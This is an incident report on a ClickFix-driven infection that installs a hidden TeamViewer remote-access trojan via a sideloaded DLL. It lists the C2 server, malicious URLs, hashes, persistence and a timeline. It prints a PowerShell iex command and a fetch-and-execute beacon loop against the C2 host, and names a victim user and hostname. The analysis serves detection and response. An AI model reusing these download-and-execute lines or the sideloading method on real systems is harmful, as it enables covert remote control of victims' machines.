# Incident Report — Malware Infection, 2025-01-22

## 1. Victim Host

| Attribute | Value |
|---|---|
| IPv4 address | **10.1.17.215** |
| MAC address | **00:d0:b7:26:4a:74** (Intel NIC) |
| Windows hostname | **DESKTOP-L8C5GSJ** (confirmed via DHCP option 12 and NetBIOS/DNS dynamic update) |
| AD domain | bluemoontuesday.com (DC: WIN-GSH54QLW48D.bluemoontuesday.com, 10.1.17.2) |
| Logged-in Windows user | **shutchenson** (observed as Kerberos CNameString in AS-REQ traffic from 10.1.17.215) |

## 2. Malware Family / Attribution

**Initial access technique: ClickFix** (fake verification/CAPTCHA page that social-engineers the victim into pasting an attacker-supplied command into the Windows Run dialog, executed via `mshta.exe`/PowerShell). This is confirmed by:
- Sequential visits to `google-authenticator.burleson-appliance.net` (t=38.2s), `authenticatoor.org` (t=38.9s, a known ClickFix lure/verification-page domain), and `appointedtimeagriculture.com` (t=52.3s, likely compromised-site redirector) immediately before payload retrieval begins at t=60.1s.
- The retrieved dropper (`GET /api/file/get-file/264872`) is an HTA-style `<component><script language="VBScript">` wrapper — a payload format specific to `mshta.exe`/clipboard-paste execution chains, and the requesting client used the default WinHTTP/mshta user-agent string (`Mozilla/4.0 (compatible; MSIE 7.0; ... Trident/7.0 ...)`).

**Final-stage payload: a hidden/silent TeamViewer Remote-Access Trojan** built by sideloading a malicious `TV.dll` into a legitimate, signed `TeamViewer.exe`. This is **behavioral attribution, not signature-confirmed** — no self-identifying family name (e.g., a known commodity RAT string) was found in any binary or script; the classification is based on observed technique:
- `TV.dll` (12,920 bytes) exports `CreateMutexA_hooked` and `ShowWindow_hooked` and performs `CreateIATHook`/`EnableHook` to intercept TeamViewer's own API calls — disabling its single-instance mutex check and suppressing its UI window, allowing TeamViewer to run completely hidden while providing the attacker full remote control/desktop access.
- The DLL also contains a hardcoded command: `powershell -command "iex (gc ('C:\ProgramData\huo\pas.ps1') | out-string)"`, chaining the hidden TeamViewer process into a persistent PowerShell beacon loop.
- Persistence: files staged under `C:\ProgramData\huo\`, with a `TeamViewer.lnk` shortcut written to the user's Startup folder pointing at `C:\ProgramData\huo\TeamViewer.exe`.
- Once running, the compromised host successfully reached legitimate TeamViewer network infrastructure (`master16.teamviewer.com` → 185.188.32.26, plus `ping3.dyngate.com`/`din.aspx`/`foots.php` check-in traffic), meaning the attacker obtained a live, hidden remote-control channel riding on legitimate TeamViewer plumbing.

## 3. Indicators of Compromise (all observed directly in this capture)

**Command-and-control endpoint**
- `5.252.153.241:80` (HTTP) — sole C2/staging server for the entire infection. Used for dropper delivery, second-stage script delivery, staged-file downloads, and an infinite PowerShell beacon loop (`while($true){DownloadString($url); Invoke-Expression $result; sleep 5}`) where the bot ID is the victim's C: drive volume serial number (decimal `1517096937`), queried as `GET http://5.252.153.241/1517096937`.

**Malicious/lure domains (ClickFix chain, resolved and contacted before payload retrieval)**
- `google-authenticator.burleson-appliance.net` → 104.21.x.1 (Cloudflare) — first lure page, t=38.2s
- `authenticatoor.org` → 82.221.136.26 — ClickFix verification/lure page, t=38.9s
- `appointedtimeagriculture.com` → 217.70.186.109 — redirector immediately preceding payload fetch, t=52.3s

**Malicious URLs**
- `http://5.252.153.241/api/file/get-file/264872` — initial VBScript/HTA dropper
- `http://5.252.153.241/api/file/get-file/29842.ps1` — decodes to the disk-serial-based C2 beacon loop
- `http://5.252.153.241:80/api/file/get-file/TeamViewer` — legitimate signed TeamViewer.exe (abused, not itself malicious)
- `http://5.252.153.241/api/file/get-file/Teamviewer_Resource_fr` — legitimate TeamViewer resource DLL
- `http://5.252.153.241/api/file/get-file/TV` — **malicious sideload DLL**
- `http://5.252.153.241/api/file/get-file/pas.ps1` — persistence-loop script written to `C:\ProgramData\huo\pas.ps1`
- `http://5.252.153.241/1517096937` (and successors) — ongoing beacon/tasking channel

**Transferred files and SHA-256 hashes**

| File (as staged) | SHA-256 | Note |
|---|---|---|
| VBScript dropper (`get-file/264872`) | `c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103` | launches hidden PowerShell → fetches 29842.ps1 |
| `29842.ps1` | `b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded` | base64-obfuscated; disk-serial C2 beacon loop |
| `TeamViewer.exe` (staged to `C:\ProgramData\huo\TeamViewer.exe`) | `904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e` | legitimate signed binary, abused for hidden remote control |
| `TV.dll` (staged to `C:\ProgramData\huo\TV.dll`) | `3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7` | **malicious IAT-hook/sideload DLL** — the actual malware component |
| `Teamviewer_Resource_fr.dll` | `9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192` | legitimate TeamViewer resource file |
| `pas.ps1` (staged to `C:\ProgramData\huo\pas.ps1`) | `a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e` | same beacon loop as 29842.ps1; runs from persistence shortcut |

**Persistence artifact**
- Startup shortcut: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\TeamViewer.lnk` → target `C:\ProgramData\huo\TeamViewer.exe`

## 4. Summary Timeline (relative to capture start)

| t (s) | Event |
|---|---|
| 38.2–52.3 | Victim browses ClickFix lure chain: burleson-appliance.net → authenticatoor.org → appointedtimeagriculture.com |
| 60.1 | First contact to C2 `5.252.153.241`, VBScript dropper retrieved |
| 60.3–62.1 | Hidden PowerShell fetches `29842.ps1`, begins beacon loop keyed on disk serial `1517096937` |
| ~62–86 | C2 tasks download of `TeamViewer.exe`, `Teamviewer_Resource_fr.dll`, `TV.dll`, `pas.ps1` into `C:\ProgramData\huo\`; Startup shortcut created |
| onward | Repeated `GET /1517096937` beacon traffic to 5.252.153.241:80 every ~5s (bursts observed); TeamViewer process connects out to legitimate TeamViewer network (master16.teamviewer.com, dyngate.com) under cover of the hidden/hooked DLL |
